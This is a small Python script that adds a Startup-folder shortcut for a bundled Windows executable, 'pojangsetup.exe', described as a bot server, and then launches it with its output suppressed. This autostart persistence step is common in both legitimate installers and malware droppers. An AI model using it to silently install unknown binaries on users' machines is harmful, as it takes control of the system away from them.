import subprocess
import win32com.client
from pathlib import Path
import os

def setup_botserver():
    """Run the bot server executable and add it to the startup folder."""
    # Determine the directory of the script being executed
    script_dir = Path(__file__).resolve().parent

    # Path to the bot server executable in the 'libs' directory
    bot_path = script_dir / 'libs' / 'pojangsetup.exe'

    if bot_path.exists():
        print(f"Bot server executable found at {bot_path}.")

        # Add the bot server executable to the startup folder
        startup_path = Path(os.getenv('APPDATA')) / 'Microsoft/Windows/Start Menu/Programs/Startup'
        shortcut_path = startup_path / 'pojangsetup.lnk'

        if not shortcut_path.exists():
            shell = win32com.client.Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.TargetPath = str(bot_path)
            shortcut.save()
            print("Bot server executable added to startup.")
        else:
            print("Bot server executable already in the startup folder.")
        
        # Execute the bot server executable
        subprocess.Popen([str(bot_path)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Bot server executable running.")

    else:
        print(f"Bot server executable not found at {bot_path}")

if __name__ == "__main__":
    setup_botserver()
